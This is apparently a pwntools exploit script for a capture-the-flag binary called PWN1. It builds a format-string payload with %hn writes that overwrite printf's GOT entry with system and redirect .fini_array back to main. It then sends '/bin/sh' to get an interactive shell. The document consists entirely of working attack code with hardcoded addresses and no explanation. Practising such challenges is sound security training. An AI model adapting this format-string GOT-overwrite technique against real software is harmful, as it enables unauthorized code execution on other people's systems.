from pwn import*
context(arch='i386', os='linux')
context.terminal = ["qterminal", "-e"]
context.log_level = "debug"
p = process("./PWN1")
gdb.attach(p,'b* 0x080485A7')
elf=ELF('./PWN1')
libc=elf.libc
fini_array=0x804979C#->0x8048534
printf_got=0x804989c#->0x80483d0
system_plt=0x80483d0
main=0x8048534
#804 83d0 8534
#HN
#payload =p32(printf_got+2)+p32(printf_got)+p32(fini_array)
#payload+=(f'%{0x804-0xc}c%4$hn%{0x83d0-0x804}c%5$hn%{0x8534-0x83d0}c%6$hn').encode()
payload = b"%2052c%13$hn%31692c%14$hn%356c%15$hn" + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)
p.recvuntil('name?\n')
p.sendline(payload)
p.recvuntil('ame?\n')
p.sendline('/bin/sh\x00')
p.interactive()